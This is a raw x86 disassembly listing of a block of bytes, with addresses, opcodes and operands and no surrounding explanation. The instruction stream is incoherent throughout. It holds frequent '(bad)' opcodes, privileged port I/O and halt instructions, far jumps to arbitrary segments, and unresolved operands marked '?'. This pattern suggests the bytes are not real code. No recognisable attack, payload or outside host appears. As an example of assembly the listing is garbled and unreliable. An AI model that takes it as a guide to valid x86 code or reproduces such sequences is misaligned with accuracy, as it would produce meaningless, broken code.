  51b734:	pop    eax
  51b735:	cdq    
  51b736:	inc    ebp
  51b737:	out    dx,al
  51b738:	xchg   edi,eax
  51b739:	xor    esp,edx
  51b73b:	pop    ss
  51b73c:	retf   0x3c7e
  51b73f:	mov    bl,0xcd
  51b741:	mov    edx,0x994ec6c5
  51b746:	xchg   edi,edx
  51b748:	xor    DWORD PTR [ebp-0x21483275],esp
  51b74e:	mov    dl,0x3a
  51b750:	xor    eax,0x854e9af6
  51b755:	and    edi,DWORD PTR ds:0xb13ba4da
  51b75b:	repnz lods eax,DWORD PTR ds:[esi]
  51b75d:	lock hlt 
  51b75f:	(bad)  
  51b760:	cmp    bl,BYTE PTR [edx-0x5ceeb3c0]
  51b766:	dec    edx
  51b767:	or     DWORD PTR [edx-0x21],esp
  51b76a:	fiadd  WORD PTR [eax+edx*1+0x3]
  51b76e:	pop    edx
  51b76f:	mov    cl,0xe0
  51b771:	xlat   BYTE PTR ds:[ebx]
  51b772:	stos   DWORD PTR es:[edi],eax
  51b773:	daa    
  51b774:	mov    cl,0xcc
  51b776:	mov    ecx,0xc2b122c2
  51b77b:	sbb    esp,DWORD PTR [edi+ebp*2]
  51b77e:	arpl   WORD PTR [edx],cx
  51b780:	inc    esp
  51b781:	in     eax,0x80
  51b783:	test   BYTE PTR [edx-0x7cc0f516],ch
  51b789:	push   ss
  51b78a:	xchg   esp,eax
  51b78b:	adc    ecx,ebp
  51b78d:	jbe    0x51b7f3
  51b78f:	dec    ecx
  51b790:	out    dx,eax
  51b791:	imul   edi,esi,0xffffff98
  51b794:	inc    edx
  51b795:	dec    ebx
  51b796:	mov    esp,0x2e56aa9b
  51b79b:	mov    al,ds:0xff9eca07
  51b7a0:	push   es
  51b7a1:	push   es
  51b7a2:	frstor [edx]
  51b7a4:	adc    BYTE PTR [eax+0x3e634e67],al
  51b7aa:	js     0x51b801
  51b7ac:	dec    ecx
  51b7ad:	in     eax,dx
  51b7ae:	test   dh,0x2a
  51b7b1:	aad    0x27
  51b7b3:	cmp    al,0x85
  51b7b5:	ja     0x51b73a
  51b7b7:	pushf  
  51b7b8:	dec    esi
  51b7b9:	les    esi,FWORD PTR [edx]
  51b7bb:	ret    0xbec6
  51b7be:	pop    edi
  51b7bf:	je     0x51b7ae
  51b7c1:	lods   eax,DWORD PTR ds:[esi]
  51b7c2:	lods   eax,DWORD PTR ds:[esi]
  51b7c3:	js     0x51b760
  51b7c5:	and    eax,DWORD PTR [ebx+0x4f]
  51b7c8:	mov    ebp,0x98e0913a
  51b7cd:	test   al,0x15
  51b7cf:	loop   0x51b7b8
  51b7d1:	outs   dx,BYTE PTR ds:[esi]
  51b7d2:	dec    edi
  51b7d3:	repnz (bad) 
  51b7d5:	sahf   
  51b7d6:	shr    DWORD PTR [esi-0xe],1
  51b7d9:	inc    ebp
  51b7da:	ss (bad) 
  51b7dc:	fdivr  DWORD PTR [ebp-0x1aaa0106]
  51b7e2:	lahf   
  51b7e3:	retf   0x46e9
  51b7e6:	mov    dh,0xa
  51b7e8:	in     al,dx
  51b7e9:	xchg   edi,eax
  51b7ea:	jnp    0x51b7da
  51b7ec:	loopne 0x51b788
  51b7ee:	adc    bh,BYTE PTR [ebp+0x13ff6de8]
  51b7f4:	stc    
  51b7f5:	mov    al,ds:0x809f2658
  51b7fa:	aad    0x7b
  51b7fc:	fcom   QWORD PTR [ebx]
  51b7fe:	stc    
  51b7ff:	jp     0x51b84c
  51b801:	loope  0x51b7d2
  51b803:	jecxz  0x51b7d4
  51b805:	push   edi
  51b806:	xor    eax,0x905f3697
  51b80b:	inc    eax
  51b80c:	adc    ebx,esi
  51b80e:	lods   al,BYTE PTR ds:[esi]
  51b80f:	in     eax,0x28
  51b811:	sbb    BYTE PTR [eax+eax*4+0x73b1cea1],0xff
  51b819:	test   edx,eax
  51b81b:	dec    ecx
  51b81c:	xor    esp,DWORD PTR [edx-0x77696244]
  51b822:	dec    esp
  51b823:	je     0x51b7ff
  51b825:	test   eax,0x1abf0ded
  51b82a:	das    
  51b82b:	retf   0x82a7
  51b82e:	mov    edx,0x5f80987d
  51b833:	jmp    0xc9b6:0x56f6d6db
  51b83a:	leave  
  51b83b:	mov    eax,0xf4d1bc48
  51b840:	push   es
  51b841:	add    BYTE PTR [edi+0x20],dh
  51b844:	and    eax,ebx
  51b846:	in     al,0x7d
  51b848:	or     eax,0x294bb24
  51b84d:	cmp    al,0xe5
  51b84f:	mov    edx,fs
  51b851:	sub    dl,dl
  51b853:	cmp    ah,cl
  51b855:	jmp    0x51b8cc
  51b857:	mov    esi,0x8fe04112
  51b85c:	mov    cl,0x36
  51b85e:	sbb    DWORD PTR [eax+0xe],edx
  51b861:	push   ecx
  51b862:	sti    
  51b863:	jecxz  0x51b85d
  51b865:	push   ecx
  51b866:	xchg   esi,eax
  51b867:	xchg   esi,eax
  51b868:	arpl   WORD PTR [esi+0x4f],bp
  51b86b:	aas    
  51b86c:	jp     0x51b83d
  51b86e:	imul   esi,DWORD PTR [esi+edi*1],0xe778bc10
  51b875:	(bad)  
  51b876:	jne    0x51b80f
  51b878:	xlat   BYTE PTR ds:[ebx]
  51b879:	(bad)  
  51b87a:	int3   
  51b87b:	jmp    0xa40d:0x42e3b72
  51b882:	mov    ecx,esp
  51b884:	xor    al,ah
  51b886:	cs push ebp
  51b888:	repz jg 0x51b8a4
  51b88b:	or     DWORD PTR [ebx-0x41],edi
  51b88e:	jae    0x51b8a6
  51b890:	mov    ?,eax
  51b892:	cmovge ecx,DWORD PTR [eax+0x245933e7]
  51b899:	test   al,0xf2
  51b89b:	jmp    0x74d7:0x84998a4d
  51b8a2:	pop    eax
  51b8a3:	lock mov bh,0x4
  51b8a6:	dec    esp
  51b8a7:	cmp    al,0x35
  51b8a9:	test   DWORD PTR [ecx-0x4a],edi
  51b8ac:	shr    WORD PTR cs:[esi+0x136a3a41],1
  51b8b4:	lock fbstp TBYTE PTR [esp+ecx*8]
  51b8b8:	cli    
  51b8b9:	retf   0xd299
  51b8bc:	pop    eax
  51b8bd:	add    ah,BYTE PTR [esi+0x17]
  51b8c0:	out    0xea,al
  51b8c2:	loop   0x51b919
  51b8c4:	dec    esi
  51b8c5:	sub    edx,ebx
  51b8c7:	mov    ds:0x5c5081f8,eax
  51b8cc:	fdivr  DWORD PTR [ecx*4+0x5c47c36b]
  51b8d3:	push   esp
  51b8d4:	mov    dh,BYTE PTR [ecx]
  51b8d6:	xor    esp,DWORD PTR [edi+0x24f34c68]
  51b8dc:	mov    edx,0xe75d0919
  51b8e1:	and    cl,BYTE PTR [ebp+0x75]
  51b8e4:	pop    edx
  51b8e5:	enter  0xd8d2,0xc2
  51b8e9:	or     DWORD PTR [ecx+0xf],esp
  51b8ec:	cmp    edi,0x2dc7decb
  51b8f2:	fst    DWORD PTR [edi+0x27]
  51b8f5:	icebp  
  51b8f6:	jmp    0x309e:0x4ec9ac51
  51b8fd:	mov    al,0x32
  51b8ff:	out    0x7f,eax
  51b901:	call   0xddd54db8
  51b906:	push   ebx
  51b907:	inc    ebx
  51b908:	mov    dl,0xdb
  51b90a:	add    ecx,DWORD PTR [ebp+0x72]
  51b90d:	and    eax,ebp
  51b90f:	rol    eax,0xe8
  51b912:	fsubrp st(1),st
  51b914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51b915:	neg    BYTE PTR [ecx+ebx*2+0x71]
  51b919:	pushf  
  51b91a:	mov    eax,ds:0xbb6982f4
  51b91f:	mov    bl,0x75
  51b921:	(bad)  
  51b922:	jne    0x51b8be
  51b924:	inc    esi
  51b925:	dec    esp
  51b926:	pop    ss
  51b927:	iret   
  51b928:	ds jmp 0x51b980
  51b92b:	hlt    
  51b92c:	xchg   DWORD PTR [edi-0x168f530b],edi
  51b932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51b933:	jo     0x51b95c
  51b935:	push   ebp
  51b936:	ins    BYTE PTR es:[edi],dx
  51b937:	mov    dh,BYTE PTR [edx]
  51b939:	push   0xffffffe3
  51b93b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51b93c:	xchg   esi,eax
  51b93d:	rol    esp,cl
  51b93f:	leave  
  51b940:	jae    0x51b8e6
  51b942:	ins    DWORD PTR es:[edi],dx
  51b943:	dec    edi
  51b944:	cmp    al,0x0
  51b946:	lods   al,BYTE PTR ds:[esi]
  51b947:	clc    
  51b948:	jae    0x51b92c
  51b94a:	inc    BYTE PTR [esi+0x7b9e34d2]
  51b950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51b951:	(bad)  
  51b952:	aam    0x58
  51b954:	popf   
  51b955:	fcmovb st,st(6)
  51b957:	fucomip st,st(0)
  51b959:	repnz xchg esp,eax
  51b95b:	rcr    DWORD PTR [eax],0x90
  51b95e:	pop    edx
  51b95f:	inc    ecx
  51b960:	adc    ebx,edi
  51b962:	and    al,0x87
  51b964:	aam    0x6a
  51b966:	mov    eax,0x1126b31a
  51b96b:	add    eax,0xf9fdb89c
  51b970:	or     eax,0xf88ef42b
  51b975:	nop
  51b976:	mov    ebp,0x79660d9f
  51b97b:	out    dx,al
  51b97c:	out    0x37,eax
  51b97e:	push   ebx
  51b97f:	sub    DWORD PTR [ebp-0x76],edx
  51b982:	sub    bl,BYTE PTR [edx+eax*2+0x22]
  51b986:	sbb    ebx,ebp
  51b988:	cmp    BYTE PTR [ebx],al
  51b98a:	pop    ss
  51b98b:	lahf   
  51b98c:	push   es
  51b98d:	cdq    
  51b98e:	rcl    BYTE PTR [ebp-0x21],0x51
  51b992:	imul   esp,DWORD PTR [ecx+0x48c667f7],0xffffffba
  51b999:	lods   eax,DWORD PTR ds:[esi]
  51b99a:	mov    esi,0x1e0a8196
  51b99f:	xlat   BYTE PTR ds:[ebx]
  51b9a0:	or     DWORD PTR ds:0x612bdac4,edi
  51b9a6:	adc    DWORD PTR [edi-0x2a579f09],ebx
  51b9ac:	in     al,dx
  51b9ad:	fisttp QWORD PTR [eax]
  51b9af:	ins    BYTE PTR es:[edi],dx
  51b9b0:	pop    eax
  51b9b1:	cmp    dl,BYTE PTR [edi+0x24]
  51b9b4:	mov    al,0x13
  51b9b6:	or     eax,0x545f96fb
  51b9bb:	icebp  
  51b9bc:	adc    al,0x2c
  51b9be:	cmp    dh,al
  51b9c0:	jne    0x51b99b
  51b9c2:	fdivr  DWORD PTR [ecx]
  51b9c4:	dec    ebx
  51b9c5:	dec    ebp
  51b9c6:	ficomp DWORD PTR ds:0x90c2c3c8
  51b9cc:	jle    0x51ba1d
  51b9ce:	ins    BYTE PTR es:[edi],dx
  51b9cf:	fistp  WORD PTR [ecx-0x10]
  51b9d2:	dec    edx
  51b9d3:	sahf   
  51b9d4:	push   ds
  51b9d5:	and    bl,BYTE PTR [edi+ebx*4-0x51f21e6e]
  51b9dc:	arpl   WORD PTR [ecx+0x46734929],ax
  51b9e2:	mov    edi,DWORD PTR [edi]
  51b9e4:	retf   
  51b9e5:	jecxz  0x51b9db
  51b9e7:	adc    bh,dh
  51b9e9:	mov    cl,0x9c
  51b9eb:	sbb    ebp,DWORD PTR [esi-0x72c43fa3]
  51b9f1:	test   ah,dl
  51b9f3:	cmp    dl,BYTE PTR ss:[ecx+0x75]
  51b9f7:	mov    ds:0xf14af6b4,al
  51b9fc:	jl     0x51b9d7
  51b9fe:	aaa    
  51b9ff:	mov    dh,al
  51ba01:	fs in  al,dx
  51ba03:	test   DWORD PTR [ecx],ecx
  51ba05:	sbb    edi,DWORD PTR [ecx]
  51ba07:	adc    al,0x67
  51ba09:	adc    bh,cl
  51ba0b:	xor    al,ah
  51ba0d:	clc    
  51ba0e:	xchg   esi,eax
  51ba0f:	cli    
  51ba10:	icebp  
  51ba11:	mov    dh,0xb5
  51ba13:	sbb    al,BYTE PTR [eax+eiz*2]
  51ba16:	and    eax,DWORD PTR [ecx+0x57]
  51ba19:	loop   0x51ba42
  51ba1b:	jp     0x51ba9c
  51ba1d:	sub    DWORD PTR [edi+ecx*1-0x5233e7da],0xffffffde
  51ba25:	cld    
  51ba26:	mov    al,ds:0xddb3c246
  51ba2b:	bt     DWORD PTR [edi+edi*2+0x2e],ebx
  51ba30:	sbb    BYTE PTR [eax-0x589d61dc],ch
  51ba36:	mov    ah,0x34
  51ba38:	cld    
  51ba39:	(bad)
  51ba3c:	xchg   ecx,eax
  51ba3d:	test   ah,0x98
  51ba40:	ret    
  51ba41:	and    BYTE PTR [ebx-0x37644bfa],ah
  51ba47:	je     0x51b9ca
  51ba49:	mov    ecx,0xc2568f78
  51ba4e:	jecxz  0x51ba77
  51ba50:	xchg   edi,eax
  51ba51:	push   ss
  51ba52:	push   esi
  51ba53:	xor    eax,0xe4125dd8
  51ba58:	xor    DWORD PTR [edx-0xe39e055],eax
  51ba5e:	xor    edi,ecx
  51ba60:	push   ss
  51ba61:	lock mov cl,0xbc
  51ba64:	mov    bh,0x24
  51ba66:	push   eax
  51ba67:	cmp    ecx,DWORD PTR [esi+0x5d798a5c]
  51ba6d:	mov    edi,0x6eaf92cd
  51ba72:	gs dec bx
  51ba75:	imul   BYTE PTR [eax+0x46]
  51ba78:	push   eax
  51ba79:	aad    0x23
  51ba7b:	mov    cl,0xdb
  51ba7d:	shr    BYTE PTR [edi+0x708bc337],1
  51ba83:	mov    edi,0x6c52b0a2
  51ba88:	push   edx
  51ba89:	sbb    dh,BYTE PTR [edi]
  51ba8b:	jae    0x51bab9
  51ba8d:	xor    esi,DWORD PTR [ebp-0x5b38a0ca]
  51ba93:	ret    0x9eff
  51ba96:	mov    al,ds:0x7544ad98
  51ba9b:	ret    
  51ba9c:	push   esi
  51ba9d:	daa    
  51ba9e:	loop   0x51ba22
  51baa0:	(bad)  
  51baa1:	shl    DWORD PTR [ecx-0xab0c4ae],cl
  51baa7:	daa    
  51baa8:	inc    eax
  51baa9:	jns    0x51babe
  51baab:	xchg   DWORD PTR [eax-0x2f],esi
  51baae:	ret    
  51baaf:	pop    ss
  51bab0:	xchg   edx,eax
  51bab1:	inc    edx
  51bab2:	retf   
  51bab3:	ins    DWORD PTR es:[edi],dx
  51bab4:	pop    ecx
  51bab5:	xchg   BYTE PTR [esi],ch
  51bab7:	hlt    
  51bab8:	adc    BYTE PTR es:[ecx-0x491ab96c],dl
  51babf:	or     eax,0xec16b2b6
  51bac4:	sub    edx,DWORD PTR [esi]
  51bac6:	sub    ch,ch
  51bac8:	sar    BYTE PTR [edx],cl
  51baca:	add    al,0x60
  51bacc:	ret    0x299
  51bacf:	rcl    DWORD PTR es:[esp+ebx*8-0x2ce2aac6],cl
  51bad7:	cli    
  51bad8:	mov    ch,0x59
  51bada:	ret    
  51badb:	rol    dl,1
  51badd:	shl    DWORD PTR [eax],0xcb
  51bae0:	mov    WORD PTR [esi],gs
  51bae2:	add    DWORD PTR [ebp+0x55],eax
  51bae5:	sbb    al,0x27
  51bae8:	dec    eax
  51bae9:	jecxz  0x51bb32
  51baeb:	xchg   DWORD PTR [edi-0x76],edx
  51baee:	xchg   DWORD PTR [esi],edx
  51baf0:	mov    WORD PTR [edx],?
  51baf2:	pop    edi
  51baf3:	mov    cl,0x83
  51baf5:	into   
  51baf6:	arpl   WORD PTR ds:0x195b2dcd,cx
  51bafc:	lods   eax,DWORD PTR ds:[esi]
  51bafd:	test   BYTE PTR [eax],dl
  51baff:	and    DWORD PTR [ebx+0x21e0444b],ebp
  51bb05:	push   edx
  51bb06:	dec    edx
  51bb07:	arpl   WORD PTR [edx-0x24],ax
  51bb0a:	fsubr  QWORD PTR [edx]
  51bb0c:	aam    0x9
  51bb0e:	jg     0x51baa5
  51bb10:	outs   dx,DWORD PTR ds:[esi]
  51bb11:	push   ds
  51bb12:	adc    edi,DWORD PTR [ebx+0x3d544724]
  51bb18:	mov    BYTE PTR [edi+0x46],al
  51bb1b:	xchg   esp,eax
  51bb1c:	jo     0x51baff
  51bb1e:	push   0x3c
  51bb20:	std    
  51bb21:	sbb    BYTE PTR [ebx],cl
  51bb23:	icebp  
  51bb24:	mov    esp,0x9bf6ea29
  51bb29:	adc    DWORD PTR [ecx],0xffffff88
  51bb2c:	jecxz  0x51bb9f
  51bb2e:	mov    esi,0xe589cd75
  51bb33:	pop    ds
  51bb34:	mov    cs,WORD PTR [edi+0xaf68036]
  51bb3a:	jo     0x51bbb6
  51bb3c:	pop    esp
  51bb3d:	jmp    0x734:0x22ccaab8
  51bb44:	sub    esp,eax
  51bb46:	jns    0x51bb9c
  51bb48:	sub    DWORD PTR [edi-0x29147b43],eax
  51bb4e:	xchg   ebx,eax
  51bb4f:	cmp    dh,cl
  51bb51:	push   0x1d
  51bb53:	mov    es,WORD PTR [eax+ebp*2]
  51bb56:	enter  0x4aff,0x7
  51bb5a:	mov    ds:0x32845360,al
  51bb5f:	outs   dx,DWORD PTR ds:[esi]
  51bb60:	add    eax,0x29c8e242
  51bb65:	jae    0x51bb26
  51bb67:	iret   
  51bb68:	out    dx,al
  51bb69:	xor    BYTE PTR [ecx-0xcb79a84],cl
  51bb6f:	mov    edi,DWORD PTR ds:0x2d0fed42
  51bb75:	or     BYTE PTR [ebp+edi*2-0x69e11efb],al
  51bb7c:	rol    ecx,1
  51bb7e:	push   0xe27f302a
  51bb83:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  51bb85:	and    DWORD PTR [ecx],ebx
  51bb87:	cmc    
  51bb88:	mov    bl,bh
  51bb8a:	fidivr DWORD PTR ds:0x462db8c3
  51bb90:	add    ch,ah
  51bb92:	mov    dh,0x84
  51bb94:	rol    BYTE PTR [edi+edx*2-0x37],0x1
  51bb99:	scas   eax,DWORD PTR es:[edi]
  51bb9a:	popf   
  51bb9b:	push   eax
  51bb9c:	xor    BYTE PTR [ebp-0x3f32f5c3],dl
  51bba2:	mov    cl,0x8b
  51bba4:	daa    
  51bba5:	mov    ebp,cs
  51bba7:	xor    eax,0x15b30e20
  51bbac:	(bad)  
  51bbad:	pusha  
  51bbae:	daa    
  51bbaf:	nop
  51bbb0:	jae    0x51bbad
  51bbb2:	clc    
  51bbb3:	fstp   TBYTE PTR [ebx+ecx*1+0x5e]
  51bbb7:	std    
  51bbb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51bbb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51bbba:	fidiv  WORD PTR [eiz*8+0xf64d981]
  51bbc1:	sub    esp,edx
  51bbc3:	lock mov esp,0x14f65ca5
  51bbc9:	retf   
  51bbca:	lock jmp 0x34c9:0xd4224881
  51bbd2:	pushf  
  51bbd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51bbd4:	jmp    0xa4770526
  51bbd9:	fmulp  st(0),st
  51bbdb:	mov    ebp,0x1ceec121
  51bbe0:	push   esp
  51bbe1:	pop    ds
  51bbe2:	mov    esi,0xe1c99021
  51bbe7:	jb     0x51bbb7
  51bbe9:	jl     0x51bc52
  51bbeb:	hlt    
  51bbec:	mov    bl,0xa2
  51bbee:	outs   dx,BYTE PTR ds:[esi]
  51bbef:	jb     0x51bc2c
  51bbf1:	mov    bh,BYTE PTR [ebx-0x31]
  51bbf4:	cmc    
  51bbf5:	and    BYTE PTR ds:0x6af3e466,dl
  51bbfb:	lahf   
  51bbfc:	ins    DWORD PTR es:[edi],dx
  51bbfd:	sbb    ebx,DWORD PTR [edi+0x4f]
  51bc00:	dec    eax
  51bc01:	cs nop
  51bc03:	stos   BYTE PTR es:[edi],al
  51bc04:	xchg   edx,edi
  51bc06:	stos   DWORD PTR es:[edi],eax
  51bc07:	push   esp
  51bc08:	repz out 0xff,al
  51bc0b:	cmova  ebp,DWORD PTR [edi+0x2decb1c3]
  51bc12:	push   0xffffffa8
  51bc14:	dec    esi
  51bc15:	jge    0x51bbdc
  51bc17:	jge    0x51bc17
  51bc19:	mov    ch,0x4e
  51bc1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51bc1c:	pop    ds
  51bc1d:	mul    DWORD PTR [esi]
  51bc1f:	daa    
  51bc20:	sti    
  51bc21:	mov    ecx,DWORD PTR gs:[ecx]
  51bc24:	sbb    DWORD PTR [esi],edx
  51bc26:	xor    DWORD PTR [ecx+0x2f],esp
  51bc29:	aas    
  51bc2a:	push   ss
  51bc2b:	and    al,0x72
  51bc2d:	mov    ah,0xf3
  51bc2f:	data16 and dl,cl
  51bc32:	sbb    DWORD PTR [esp+esi*1+0x27],esp
  51bc36:	dec    esi
  51bc37:	iret   
  51bc38:	dec    ecx
  51bc39:	mov    al,ds:0x3f78b772
  51bc3e:	mov    eax,ds:0xf49647f
  51bc43:	in     eax,dx
  51bc44:	fs sub eax,0x45a45f5e
  51bc4a:	or     al,0x43
  51bc4c:	mov    ah,BYTE PTR [esi-0x35]
  51bc4f:	add    cl,0x3
  51bc52:	mov    bh,0x27
  51bc54:	or     eax,0x4a77e6e4
  51bc59:	dec    ebx
  51bc5a:	fdivr  DWORD PTR [eax]
  51bc5c:	scas   eax,DWORD PTR es:[edi]
  51bc5d:	cmp    al,dh
  51bc5f:	out    dx,eax
  51bc60:	cmc    
  51bc61:	fucomi st,st(2)
  51bc63:	inc    edx
  51bc64:	(bad)  
  51bc65:	out    0x8c,eax
  51bc67:	stos   BYTE PTR es:[edi],al
  51bc68:	(bad)  
  51bc69:	xchg   esi,eax
  51bc6a:	fisub  DWORD PTR [ecx+0x3]
  51bc6d:	shr    BYTE PTR [eax],0xa0
  51bc70:	adc    eax,DWORD PTR [eax+0x1f]
  51bc73:	enter  0xf1d3,0x15
  51bc77:	adc    edi,eax
  51bc79:	(bad)  
  51bc7a:	mov    edi,0x4638523b
  51bc7f:	jmp    DWORD PTR [edx]
  51bc81:	jns    0x51bcf7
  51bc83:	pop    ebx
  51bc84:	push   0xffffffe8
  51bc86:	push   edx
  51bc87:	enter  0x122b,0x49
  51bc8b:	addr16 rol edx,1
  51bc8e:	mov    edx,0xcda95d2b
  51bc93:	rcl    DWORD PTR [ebp+0x455f4c6a],cl
  51bc99:	rol    DWORD PTR [ecx],1
  51bc9b:	pop    eax
  51bc9c:	push   esp
  51bc9d:	xchg   edi,eax
  51bc9e:	jbe    0x51bcc6
  51bca0:	add    eax,0x6726ddbc
  51bca5:	sbb    dl,BYTE PTR [ecx]
  51bca7:	in     al,dx
  51bca8:	push   cs
  51bca9:	inc    ebx
  51bcaa:	jb     0x51bc2e
  51bcac:	loope  0x51bc7b
  51bcae:	call   0x5fdf:0x622703f5
  51bcb5:	lahf   
  51bcb6:	in     eax,0xb6
  51bcb8:	ins    BYTE PTR es:[edi],dx
  51bcb9:	fiadd  WORD PTR [eax-0x6e]
  51bcbc:	pop    ds
  51bcbd:	retf   
  51bcbe:	loop   0x51bc45
  51bcc0:	jecxz  0x51bc68
  51bcc2:	push   DWORD PTR [ebx+edi*1]
  51bcc5:	and    BYTE PTR [edi],ah
  51bcc7:	push   ecx
  51bcc8:	ret    0x181c
  51bccb:	cmp    DWORD PTR [esi+eiz*2-0x79733daa],0x2eaabb82
  51bcd6:	lods   eax,DWORD PTR ds:[esi]
  51bcd7:	loop   0x51bc98
  51bcd9:	aaa    
  51bcda:	lahf   
  51bcdb:	jno    0x51bca7
  51bcdd:	cdq    
  51bcde:	mov    eax,ds:0xd1d3dda6
  51bce3:	icebp  
  51bce4:	push   0x10
  51bce6:	sbb    ebp,DWORD PTR [ebx-0x340c6051]
  51bcec:	inc    esi
  51bced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51bcee:	and    al,0x3b
  51bcf0:	mov    ecx,0xe3bf4118
  51bcf5:	mov    WORD PTR [ebx-0x74ec9ca1],cs
  51bcfb:	scas   al,BYTE PTR es:[edi]
  51bcfc:	shl    bl,1
  51bcfe:	loopne 0x51bce4
  51bd00:	jecxz  0x51bc97
  51bd02:	jle    0x51bd0d
  51bd04:	and    eax,0x7dc1183d
  51bd09:	dec    eax
  51bd0a:	jge    0x51bce7
  51bd0c:	add    dh,BYTE PTR [ebx-0xc]
  51bd0f:	int    0xc8
  51bd11:	xchg   ebp,eax
  51bd12:	push   es
  51bd13:	popa   
  51bd14:	in     eax,dx
  51bd15:	jo     0x51bd1e
  51bd17:	mov    ah,0x33
  51bd19:	loope  0x51bd76
  51bd1b:	fldcw  WORD PTR [ebx+0x12a6df8]
  51bd21:	or     eax,0x74ac4c5f
  51bd26:	js     0x51bd62
  51bd28:	push   ss
  51bd29:	xchg   edi,eax
  51bd2a:	icebp  
  51bd2b:	sbb    eax,0x9048d0bf
  51bd30:	mov    edi,0xe89c75b3
  51bd35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51bd36:	loopne 0x51bcd4
  51bd38:	test   BYTE PTR [edi],ch
  51bd3a:	jl     0x51bd74
  51bd3c:	cmp    al,bl
  51bd3e:	shl    DWORD PTR [ebx+0x6d3bcf67],cl
  51bd44:	sub    dh,BYTE PTR ds:0x46779c17
  51bd4a:	fld    QWORD PTR [esi]
  51bd4c:	pop    ecx
  51bd4d:	adc    DWORD PTR ds:0x9da9555b,ecx
  51bd53:	ret    0xebb1
  51bd56:	push   ds
  51bd57:	add    eax,0x71ba04af
  51bd5c:	repz mov ah,0x25
  51bd5f:	test   DWORD PTR [ecx+ebp*4],ebp
  51bd62:	stc    
  51bd63:	enter  0x857b,0x5c
  51bd67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51bd68:	stos   DWORD PTR es:[edi],eax
  51bd69:	pop    edx
  51bd6a:	and    bh,BYTE PTR [esi+0x1f]
  51bd6d:	call   0x902824f0
  51bd72:	push   cs
  51bd73:	dec    ebx
  51bd74:	sub    DWORD PTR [eax],ebp
  51bd76:	stos   BYTE PTR es:[edi],al
  51bd77:	jb     0x51bd40
  51bd79:	push   0xffffffcf
  51bd7b:	arpl   WORD PTR [ebp+0x5e],ax
  51bd7e:	in     al,dx
  51bd7f:	pop    ebp
  51bd80:	shl    dl,1
  51bd82:	dec    edi
  51bd83:	js     0x51bdaf
  51bd85:	(bad)  
  51bd86:	mov    DWORD PTR [ecx-0x4f],eax
  51bd89:	mov    esi,eax
  51bd8b:	bsf    eax,DWORD PTR [eax]
  51bd8e:	not    BYTE PTR [edx]
  51bd90:	dec    edx
  51bd91:	add    edx,DWORD PTR [ecx]
  51bd93:	push   eax
  51bd94:	mov    eax,0xde479e55
  51bd99:	push   es
  51bd9a:	rol    ebp,1
  51bd9c:	xchg   edi,eax
  51bd9d:	js     0x51be17
  51bd9f:	mov    edx,0x4487eba0
  51bda4:	dec    ecx
  51bda5:	rcl    BYTE PTR [edi-0x4],cl
  51bda8:	cdq    
  51bda9:	(bad)  
  51bdab:	lock mov ds:0xaf2921b0,eax
  51bdb1:	into   
  51bdb2:	inc    ebx
  51bdb3:	xlat   BYTE PTR ds:[ebx]
  51bdb4:	es push cs
  51bdb6:	and    BYTE PTR [eax+0x5c],0x2c
  51bdba:	(bad)  
  51bdbb:	cmp    edx,ecx
  51bdbd:	lds    esp,FWORD PTR [edx]
  51bdbf:	add    al,0xfb
  51bdc1:	push   0x48
  51bdc3:	ds sar edi,cl
  51bdc6:	adc    BYTE PTR [esi-0x6d9f3d39],dl
  51bdcc:	and    BYTE PTR [eax+0x37],bl
  51bdcf:	sub    esp,ebp
  51bdd1:	or     BYTE PTR [edx+0x3e095ab6],cl
  51bdd7:	scas   al,BYTE PTR es:[edi]
  51bdd8:	cmp    eax,0x42d58efa
  51bddd:	mov    dl,0x6
  51bddf:	adc    eax,0x2b13ef30
  51bde4:	mov    dl,0x97
  51bde6:	cld    
  51bde7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51bde8:	loopne 0x51bdf1
  51bdea:	aas    
  51bdeb:	int3   
  51bdec:	add    cl,bh
  51bdee:	mov    ss,WORD PTR [ebp-0x22]
  51bdf1:	mov    edx,0x4754c74d
  51bdf6:	adc    DWORD PTR [ebx+0x5a745c28],edx
  51bdfc:	call   FWORD PTR [esi-0x70]
  51bdff:	dec    edx
  51be00:	leave  
  51be01:	xor    al,0x88
  51be03:	or     bl,bl
  51be05:	xchg   edi,eax
  51be06:	call   0x1745:0x45f2b9dc
  51be0d:	xor    DWORD PTR [ebp-0x21],eax
  51be10:	out    0x39,al
  51be12:	add    bh,BYTE PTR [edi+0x68]
  51be15:	rol    BYTE PTR [eax],0x7f
  51be18:	inc    ebp
  51be19:	add    ecx,DWORD PTR [esp+eax*4+0x8]
  51be1d:	sbb    esp,DWORD PTR [ebp+0x2a57c8a6]
  51be23:	mov    edx,0x6844a4cd
  51be28:	add    ebx,DWORD PTR [eax+0x45]
  51be2b:	sub    BYTE PTR ds:0x33f2694b,cl
  51be31:	int    0x72
  51be33:	mov    eax,ecx
  51be35:	push   edx
  51be36:	adc    esp,ebp
  51be38:	inc    edx
  51be39:	rol    BYTE PTR [ebp-0x50],1
  51be3c:	cdq    
  51be3d:	(bad)  [eax+0x74]
  51be40:	cmp    eax,0xfe1f67c7
  51be45:	shl    BYTE PTR [ebp-0x2a],cl
  51be48:	les    esi,FWORD PTR [di]
  51be4b:	push   gs
  51be4d:	cdq    
  51be4e:	push   eax
  51be4f:	mov    bl,0xe9
  51be51:	mul    BYTE PTR [ebx]
  51be53:	mov    WORD PTR [ebx-0x23a060f6],?
  51be59:	es xchg edi,eax
  51be5b:	imul   si,WORD PTR [ebp-0x70397827],0xffd8
  51be63:	(bad)  
  51be64:	aas    
  51be65:	lds    ecx,FWORD PTR [esi+0x14846900]
  51be6b:	shr    BYTE PTR [ecx-0x687620f3],0xcb
  51be72:	adc    ch,dl
  51be74:	mov    ah,0xda
  51be76:	dec    ebp
  51be77:	and    BYTE PTR [edi*2-0x1b9d5c6f],ch
  51be7e:	xchg   esp,eax
